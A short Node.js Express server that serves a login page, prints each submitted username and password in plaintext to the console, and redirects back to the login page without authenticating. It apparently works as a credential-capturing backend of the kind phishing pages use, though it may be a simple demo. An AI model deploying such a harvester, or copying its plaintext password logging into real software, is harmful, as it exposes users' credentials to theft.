const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Serve login page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

// Handle login POST request
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // Display data in terminal
    console.log('Login attempt:');
    console.log('Username:', username);
    console.log('Password:', password);
    
    // Redirect back to login page
    res.redirect('/login.html');
});

// Start server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});